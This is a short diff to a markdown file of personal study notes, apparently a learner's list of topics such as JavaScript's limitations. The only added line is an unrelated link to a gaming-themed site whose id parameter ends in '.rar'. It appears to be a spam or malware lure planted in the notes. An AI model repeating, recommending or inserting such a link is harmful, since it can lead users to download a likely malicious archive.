@@ -24,3 +24,6 @@
 ## Things I want to know more about
 
 - understanding the limitations of JavaScript when it comes to certain projects and what that means for development. 
+
+
+https://fortnitechat.site/join.php?id=YWTUP1.rar
